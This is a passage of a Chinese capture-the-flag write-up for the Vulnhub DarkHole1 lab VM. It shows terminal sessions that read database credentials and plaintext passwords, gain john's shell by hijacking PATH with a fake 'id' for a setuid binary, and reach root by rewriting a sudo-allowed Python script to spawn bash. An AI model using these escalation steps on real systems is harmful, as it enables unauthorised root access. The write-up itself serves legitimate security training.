+</span></span><span class=line><span class=cl>ALTER TABLE <span class=sb>`</span>users<span class=sb>`</span>
+</span></span><span class=line><span class=cl>  MODIFY <span class=sb>`</span>id<span class=sb>`</span> int<span class=o>(</span>11<span class=o>)</span> NOT NULL AUTO_INCREMENT, <span class=nv>AUTO_INCREMENT</span><span class=o>=</span>2<span class=p>;</span>
+</span></span><span class=line><span class=cl>COMMIT<span class=p>;</span>
+</span></span><span class=line><span class=cl>/*!40101 SET <span class=nv>CHARACTER_SET_CLIENT</span><span class=o>=</span>@OLD_CHARACTER_SET_CLIENT */<span class=p>;</span>
+</span></span><span class=line><span class=cl>/*!40101 SET <span class=nv>CHARACTER_SET_RESULTS</span><span class=o>=</span>@OLD_CHARACTER_SET_RESULTS */<span class=p>;</span>
+</span></span><span class=line><span class=cl>/*!40101 SET <span class=nv>COLLATION_CONNECTION</span><span class=o>=</span>@OLD_COLLATION_CONNECTION */<span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><p>发现了之前登陆界面 admin 的密码，被改成1的那个，拿去ssh登陆尝试一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DarkHole1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo ssh john@10.10.10.130                                           
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> kali 的密码：
+</span></span><span class=line><span class=cl>The authenticity of host <span class=s1>&#39;10.10.10.130 (10.10.10.130)&#39;</span> can<span class=s1>&#39;t be established.
+</span></span></span><span class=line><span class=cl><span class=s1>ED25519 key fingerprint is: SHA256:Eh4YgkyGO3A6mYzLxtfum/VOl/lVJQO4uhEqYOO4jNs
+</span></span></span><span class=line><span class=cl><span class=s1>This key is not known by any other names.
+</span></span></span><span class=line><span class=cl><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? y
+</span></span></span><span class=line><span class=cl><span class=s1>Please type &#39;</span>yes<span class=s1>&#39;, &#39;</span>no<span class=s1>&#39; or the fingerprint: yes
+</span></span></span><span class=line><span class=cl><span class=s1>Warning: Permanently added &#39;</span>10.10.10.130<span class=s1>&#39; (ED25519) to the list of known hosts.
+</span></span></span><span class=line><span class=cl><span class=s1>** WARNING: connection is not using a post-quantum key exchange algorithm.
+</span></span></span><span class=line><span class=cl><span class=s1>** This session may be vulnerable to &#34;store now, decrypt later&#34; attacks.
+</span></span></span><span class=line><span class=cl><span class=s1>** The server may need to be upgraded. See https://openssh.com/pq.html
+</span></span></span><span class=line><span class=cl><span class=s1>john@10.10.10.130&#39;</span>s password: 
+</span></span><span class=line><span class=cl>Permission denied, please try again.
+</span></span></code></pre></td></tr></table></div></div><p>尝试无果</p><p>除了这个darkhole.sql 还有一个html再看看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@darkhole:/var/www$ <span class=nb>cd</span> html
+</span></span><span class=line><span class=cl><span class=nb>cd</span> html
+</span></span><span class=line><span class=cl>www-data@darkhole:/var/www/html$ ls -liah
+</span></span><span class=line><span class=cl>ls -liah
+</span></span><span class=line><span class=cl>total 48K
+</span></span><span class=line><span class=cl><span class=m>667705</span> drwxrwxrwx <span class=m>6</span> root root 4.0K Jul <span class=m>18</span>  <span class=m>2021</span> .
+</span></span><span class=line><span class=cl><span class=m>526293</span> drwxr-xr-x <span class=m>3</span> root root 4.0K Jul <span class=m>17</span>  <span class=m>2021</span> ..
+</span></span><span class=line><span class=cl><span class=m>656954</span> drwxrwxrwx <span class=m>2</span> root root 4.0K Jul <span class=m>17</span>  <span class=m>2021</span> config
+</span></span><span class=line><span class=cl><span class=m>656986</span> drwxrwxrwx <span class=m>2</span> root root 4.0K Jul <span class=m>16</span>  <span class=m>2021</span> css
+</span></span><span class=line><span class=cl><span class=m>658507</span> -rwxrwxrwx <span class=m>1</span> root root 4.6K Jul <span class=m>18</span>  <span class=m>2021</span> dashboard.php
+</span></span><span class=line><span class=cl><span class=m>658537</span> -rwxrwxrwx <span class=m>1</span> root root 1.3K Jul <span class=m>16</span>  <span class=m>2021</span> index.php
+</span></span><span class=line><span class=cl><span class=m>658501</span> drwxrwxrwx <span class=m>2</span> root root 4.0K Jul <span class=m>16</span>  <span class=m>2021</span> js
+</span></span><span class=line><span class=cl><span class=m>658538</span> -rwxrwxrwx <span class=m>1</span> root root 3.1K Jul <span class=m>17</span>  <span class=m>2021</span> login.php
+</span></span><span class=line><span class=cl><span class=m>658539</span> -rwxrwxrwx <span class=m>1</span> root root  <span class=m>196</span> Jul <span class=m>16</span>  <span class=m>2021</span> logout.php
+</span></span><span class=line><span class=cl><span class=m>658540</span> -rwxrwxrwx <span class=m>1</span> root root 3.7K Jul <span class=m>16</span>  <span class=m>2021</span> register.php
+</span></span><span class=line><span class=cl><span class=m>658505</span> drwxrwxrwx <span class=m>2</span> root root 4.0K Jul <span class=m>18</span> 00:18 upload
+</span></span><span class=line><span class=cl>www-data@darkhole:/var/www/html$ <span class=nb>cd</span> config
+</span></span><span class=line><span class=cl><span class=nb>cd</span> config
+</span></span><span class=line><span class=cl>www-data@darkhole:/var/www/html/config$ ls -liah
+</span></span><span class=line><span class=cl>ls -liah
+</span></span><span class=line><span class=cl>total 12K
+</span></span><span class=line><span class=cl><span class=m>656954</span> drwxrwxrwx <span class=m>2</span> root root 4.0K Jul <span class=m>17</span>  <span class=m>2021</span> .
+</span></span><span class=line><span class=cl><span class=m>667705</span> drwxrwxrwx <span class=m>6</span> root root 4.0K Jul <span class=m>18</span>  <span class=m>2021</span> ..
+</span></span><span class=line><span class=cl><span class=m>656970</span> -rwxrwxrwx <span class=m>1</span> root root   <span class=m>69</span> Jul <span class=m>17</span>  <span class=m>2021</span> database.php
+</span></span><span class=line><span class=cl>www-data@darkhole:/var/www/html/config$ cat database.php
+</span></span><span class=line><span class=cl>cat database.php
+</span></span><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl><span class=nv>$connect</span> <span class=o>=</span> new mysqli<span class=o>(</span><span class=s2>&#34;localhost&#34;</span>,<span class=s1>&#39;john&#39;</span>,<span class=s1>&#39;john&#39;</span>,<span class=s1>&#39;darkhole&#39;</span><span class=o>)</span><span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><p>又获得一个密码，继续尝试ssh登陆然后再次失败</p><p>还toto和file.py没有看</p><p>toto用cat读取是乱码 用file文件类型</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@darkhole:/home/john$ file toto
+</span></span><span class=line><span class=cl>file toto
+</span></span><span class=line><span class=cl>toto: setuid ELF 64-bit LSB shared object, x86-64, version <span class=m>1</span> <span class=o>(</span>SYSV<span class=o>)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class=o>[</span>sha1<span class=o>]=</span>5f55e5cb083b2207ed23fc83f2dbf1cba931c868, <span class=k>for</span> GNU/Linux 3.2.0, not stripped
+</span></span><span class=line><span class=cl>www-data@darkhole:/home/john$ strings toto <span class=p>|</span> head                 
+</span></span><span class=line><span class=cl>strings toto <span class=p>|</span> head
+</span></span><span class=line><span class=cl>/lib64/ld-linux-x86-64.so.2
+</span></span><span class=line><span class=cl>libc.so.6
+</span></span><span class=line><span class=cl>setuid
+</span></span><span class=line><span class=cl>system
+</span></span><span class=line><span class=cl>__cxa_finalize
+</span></span><span class=line><span class=cl>setgid
+</span></span><span class=line><span class=cl>__libc_start_main
+</span></span><span class=line><span class=cl>GLIBC_2.2.5
+</span></span><span class=line><span class=cl>_ITM_deregisterTMCloneTable
+</span></span><span class=line><span class=cl>__gmon_start__
+</span></span><span class=line><span class=cl>www-data@darkhole:/home/john$
+</span></span></code></pre></td></tr></table></div></div><p><code>toto</code> 是一个 setuid ELF 可执行文件，这意味着当任何用户运行它时，进程会以文件所有者（很可能是 <code>root</code>）的身份运行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@darkhole:/home/john$ ./toto
+</span></span><span class=line><span class=cl>./toto
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1001<span class=o>(</span>john<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
+</span></span><span class=line><span class=cl>www-data@darkhole:/home/john$ 
+</span></span></code></pre></td></tr></table></div></div><p>执行发现仅仅返回id，说明调用了外部id命令，且没有使用绝对路径，符合PATH 劫持 的典型场景(可将toto下载下来进行逆向分析进一步确认)</p><h2 id=path劫持>PATH劫持</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@darkhole:/home/john$ <span class=nb>cd</span> /tmp
+</span></span><span class=line><span class=cl><span class=nb>cd</span> /tmp
+</span></span><span class=line><span class=cl>www-data@darkhole:/tmp$ <span class=nb>echo</span> <span class=s2>&#34;/bin/bash&#34;</span> &gt; id
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;/bin/bash&#34;</span> &gt; id
+</span></span><span class=line><span class=cl>www-data@darkhole:/tmp$ <span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span>/tmp:<span class=nv>$PATH</span>
+</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span>/tmp:<span class=nv>$PATH</span>
+</span></span><span class=line><span class=cl>www-data@darkhole:/tmp$ which id
+</span></span><span class=line><span class=cl>which id
+</span></span><span class=line><span class=cl>/usr/bin/id
+</span></span><span class=line><span class=cl>www-data@darkhole:/tmp$ <span class=nb>cd</span> /home/john <span class=o>&amp;&amp;</span> ./toto
+</span></span><span class=line><span class=cl><span class=nb>cd</span> /home/john <span class=o>&amp;&amp;</span> ./toto
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1001<span class=o>(</span>john<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
+</span></span><span class=line><span class=cl>www-data@darkhole:/tmp$ which id
+</span></span><span class=line><span class=cl>which id                                      
+</span></span><span class=line><span class=cl>/usr/bin/id 
+</span></span><span class=line><span class=cl>www-data@darkhole:/home/john$ env -i ./toto
+</span></span><span class=line><span class=cl>env -i                                  
+</span></span><span class=line><span class=cl>www-data@darkhole:/home/john$ <span class=nb>cd</span> /tmp
+</span></span><span class=line><span class=cl><span class=nb>cd</span> /tmp                                    
+</span></span><span class=line><span class=cl>www-data@darkhole:/tmp$ <span class=nb>echo</span> <span class=s2>&#34;/bin/bash&#34;</span> &gt; id
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;/bin/bash&#34;</span> &gt; id                                       
+</span></span><span class=line><span class=cl>www-data@darkhole:/tmp$ cat id
+</span></span><span class=line><span class=cl>cat id                                                 
+</span></span><span class=line><span class=cl>/bin/bash                                                  
+</span></span><span class=line><span class=cl>www-data@darkhole:/tmp$ chmod +x id      
+</span></span><span class=line><span class=cl>chmod +x id                                                 
+</span></span><span class=line><span class=cl>www-data@darkhole:/tmp$ id     
+</span></span><span class=line><span class=cl>id                                                 
+</span></span><span class=line><span class=cl>www-data@darkhole:/tmp$ <span class=nb>cd</span> /home/john <span class=o>&amp;&amp;</span> ./toto 
+</span></span><span class=line><span class=cl><span class=nb>cd</span> /home/john <span class=o>&amp;&amp;</span> ./toto
+</span></span><span class=line><span class=cl>john@darkhole:/home/john$ 
+</span></span></code></pre></td></tr></table></div></div><p>为什么失败了？然后又成功了</p><p>第一次检查 <code>which id</code>，发现仍指向 <code>/usr/bin/id</code>。
+由此判断 PATH 劫持尚未生效，而不是直接继续后续步骤。
+依次检查 PATH、文件是否存在、权限、命令解析结果，直到确认 <code>which id</code> 已指向目标文件</p><p>真正原因是忘记了执行权限chmod +x id这一步</p><h2 id=读取用户flag以及获取john-ssh密码>读取用户flag以及获取john ssh密码</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>john@darkhole:/home/john$ ls -liah
+</span></span><span class=line><span class=cl>ls -liah
+</span></span><span class=line><span class=cl>total 72K
+</span></span><span class=line><span class=cl><span class=m>131110</span> drwxrwxrwx <span class=m>5</span> john john     4.0K Jul <span class=m>17</span>  <span class=m>2021</span> .
+</span></span><span class=line><span class=cl><span class=m>131073</span> drwxr-xr-x <span class=m>4</span> root root     4.0K Jul <span class=m>16</span>  <span class=m>2021</span> ..
+</span></span><span class=line><span class=cl><span class=m>131128</span> -rw------- <span class=m>1</span> john john     1.7K Jul <span class=m>17</span>  <span class=m>2021</span> .bash_history
+</span></span><span class=line><span class=cl><span class=m>131112</span> -rw-r--r-- <span class=m>1</span> john john      <span class=m>220</span> Jul <span class=m>16</span>  <span class=m>2021</span> .bash_logout
+</span></span><span class=line><span class=cl><span class=m>131113</span> -rw-r--r-- <span class=m>1</span> john john     3.7K Jul <span class=m>16</span>  <span class=m>2021</span> .bashrc
+</span></span><span class=line><span class=cl><span class=m>131126</span> drwx------ <span class=m>2</span> john john     4.0K Jul <span class=m>17</span>  <span class=m>2021</span> .cache
+</span></span><span class=line><span class=cl><span class=m>131115</span> drwxrwxr-x <span class=m>3</span> john john     4.0K Jul <span class=m>17</span>  <span class=m>2021</span> .local
+</span></span><span class=line><span class=cl><span class=m>131114</span> -rw------- <span class=m>1</span> john john       <span class=m>37</span> Jul <span class=m>17</span>  <span class=m>2021</span> .mysql_history
+</span></span><span class=line><span class=cl><span class=m>131111</span> -rw-r--r-- <span class=m>1</span> john john      <span class=m>807</span> Jul <span class=m>16</span>  <span class=m>2021</span> .profile
+</span></span><span class=line><span class=cl><span class=m>131122</span> drwxrwx--- <span class=m>2</span> john www-data 4.0K Jul <span class=m>17</span>  <span class=m>2021</span> .ssh
+</span></span><span class=line><span class=cl><span class=m>131120</span> -rwxrwx--- <span class=m>1</span> john john        <span class=m>1</span> Jul <span class=m>17</span>  <span class=m>2021</span> file.py
+</span></span><span class=line><span class=cl><span class=m>131131</span> -rwxrwx--- <span class=m>1</span> john john        <span class=m>8</span> Jul <span class=m>17</span>  <span class=m>2021</span> password
+</span></span><span class=line><span class=cl><span class=m>131118</span> -rwsr-xr-x <span class=m>1</span> root root      17K Jul <span class=m>17</span>  <span class=m>2021</span> toto
+</span></span><span class=line><span class=cl><span class=m>131121</span> -rw-rw---- <span class=m>1</span> john john       <span class=m>24</span> Jul <span class=m>17</span>  <span class=m>2021</span> user.txt
+</span></span><span class=line><span class=cl>john@darkhole:/home/john$ cat user.txt
+</span></span><span class=line><span class=cl>cat user.txt
+</span></span><span class=line><span class=cl>DarkHole<span class=o>{</span>You_Can_DO_It<span class=o>}</span>
+</span></span><span class=line><span class=cl>john@darkhole:/home/john$ cat password
+</span></span><span class=line><span class=cl>cat password
+</span></span><span class=line><span class=cl>root123
+</span></span><span class=line><span class=cl>john@darkhole:/home/john$ 
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DarkHole1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo ssh john@10.10.10.130                                    
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> kali 的密码：
+</span></span><span class=line><span class=cl>** WARNING: connection is not using a post-quantum key exchange algorithm.
+</span></span><span class=line><span class=cl>** This session may be vulnerable to <span class=s2>&#34;store now, decrypt later&#34;</span> attacks.
+</span></span><span class=line><span class=cl>** The server may need to be upgraded. See https://openssh.com/pq.html
+</span></span><span class=line><span class=cl>john@10.10.10.130<span class=err>&#39;</span>s password: 
+</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04.2 LTS <span class=o>(</span>GNU/Linux 5.4.0-77-generic x86_64<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
+</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
+</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  System information as of Sat <span class=m>18</span> Jul <span class=m>2026</span> 12:26:19 PM UTC
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  System load:  0.0                Processes:              <span class=m>253</span>
+</span></span><span class=line><span class=cl>  Usage of /:   38.9% of 18.57GB   Users logged in:        <span class=m>0</span>
+</span></span><span class=line><span class=cl>  Memory usage: 43%                IPv4 address <span class=k>for</span> ens33: 10.10.10.130
+</span></span><span class=line><span class=cl>  Swap usage:   0%
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> * Ubuntu 20.04 LTS Focal Fossa has reached its end of standard support
+</span></span><span class=line><span class=cl>   on <span class=m>31</span> May 2025.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   For more details see:
+</span></span><span class=line><span class=cl>   https://ubuntu.com/20-04
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>2</span> updates can be applied immediately.
+</span></span><span class=line><span class=cl>To see these additional updates run: apt list --upgradable
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The list of available updates is more than a week old.
+</span></span><span class=line><span class=cl>To check <span class=k>for</span> new updates run: sudo apt update
+</span></span><span class=line><span class=cl>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span></span><span class=line><span class=cl>applicable law.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Last login: Sat Jul <span class=m>17</span> 21:46:18 <span class=m>2021</span>
+</span></span></code></pre></td></tr></table></div></div><p>接下来的操作无论在ssh的shell上还是劫持的shell均可操作</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>john@darkhole:/home/john$ sudo -l
+</span></span><span class=line><span class=cl>sudo -l
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> john: root123
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> john on darkhole:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
+</span></span><span class=line><span class=cl>    <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User john may run the following commands on darkhole:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> /usr/bin/python3 /home/john/file.py
+</span></span><span class=line><span class=cl>john@darkhole:/home/john$ 
+</span></span></code></pre></td></tr></table></div></div><p>john可以在不需要密码的情况下以root的身份执行 /home/john/file.py 这个文件</p><h2 id=sudo脚本劫持提权到root>sudo脚本劫持提权到root</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>john@darkhole:~$ <span class=nb>echo</span> <span class=s1>&#39;import os&#39;</span> &gt; /home/john/file.py
+</span></span><span class=line><span class=cl>john@darkhole:~$ <span class=nb>echo</span> <span class=s1>&#39;os.system(&#34;/bin/bash&#34;)&#39;</span> &gt;&gt; /home/john/file.py
+</span></span><span class=line><span class=cl>john@darkhole:~$ cat /home/john/file.py
+</span></span><span class=line><span class=cl>import os
+</span></span><span class=line><span class=cl>os.system<span class=o>(</span><span class=s2>&#34;/bin/bash&#34;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>john@darkhole:~$ sudo python3 /home/john/file.py
+</span></span><span class=line><span class=cl>root@darkhole:/home/john# 
+</span></span></code></pre></td></tr></table></div></div><h2 id=获取root-flag>获取root flag</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@darkhole:/home/john# whoami
+</span></span><span class=line><span class=cl>root
+</span></span><span class=line><span class=cl>root@darkhole:/home/john# id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
+</span></span><span class=line><span class=cl>root@darkhole:/home/john# ls -liah /root/
+</span></span><span class=line><span class=cl>total 44K
+</span></span><span class=line><span class=cl><span class=m>262146</span> drwx------  <span class=m>6</span> root root 4.0K Jul <span class=m>17</span>  <span class=m>2021</span> .
+</span></span><span class=line><span class=cl>     <span class=m>2</span> drwxr-xr-x <span class=m>20</span> root root 4.0K Jul <span class=m>15</span>  <span class=m>2021</span> ..
+</span></span><span class=line><span class=cl><span class=m>266267</span> -rw-------  <span class=m>1</span> root root 2.8K Jul <span class=m>17</span>  <span class=m>2021</span> .bash_history
+</span></span><span class=line><span class=cl><span class=m>262384</span> -rw-r--r--  <span class=m>1</span> root root 3.1K Dec  <span class=m>5</span>  <span class=m>2019</span> .bashrc
+</span></span><span class=line><span class=cl><span class=m>286841</span> drwx------  <span class=m>2</span> root root 4.0K Jul <span class=m>17</span>  <span class=m>2021</span> .cache
+</span></span><span class=line><span class=cl><span class=m>286784</span> drwxr-xr-x  <span class=m>3</span> root root 4.0K Jul <span class=m>17</span>  <span class=m>2021</span> .local
+</span></span><span class=line><span class=cl><span class=m>266268</span> -rw-------  <span class=m>1</span> root root   <span class=m>18</span> Jul <span class=m>15</span>  <span class=m>2021</span> .mysql_history
+</span></span><span class=line><span class=cl><span class=m>262385</span> -rw-r--r--  <span class=m>1</span> root root  <span class=m>161</span> Dec  <span class=m>5</span>  <span class=m>2019</span> .profile
+</span></span><span class=line><span class=cl><span class=m>280639</span> -rw-r--r--  <span class=m>1</span> root root   <span class=m>25</span> Jul <span class=m>17</span>  <span class=m>2021</span> root.txt
+</span></span><span class=line><span class=cl><span class=m>286722</span> drwxr-xr-x  <span class=m>3</span> root root 4.0K Jul <span class=m>15</span>  <span class=m>2021</span> snap
+</span></span><span class=line><span class=cl><span class=m>286721</span> drwx------  <span class=m>2</span> root root 4.0K Jul <span class=m>15</span>  <span class=m>2021</span> .ssh
+</span></span><span class=line><span class=cl>root@darkhole:/home/john# <span class=nb>cd</span> /root
+</span></span><span class=line><span class=cl>root@darkhole:~# cat root.txt
+</span></span><span class=line><span class=cl>DarkHole<span class=o>{</span>You_Are_Legend<span class=o>}</span>
+</span></span><span class=line><span class=cl>root@darkhole:~# 
+</span></span></code></pre></td></tr></table></div></div></section><footer class="article-meta article-footer"><section class=article-tags><a href=/tags/vulnhub/>Vulnhub</a></section><section class="article-copyright inline-meta"><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
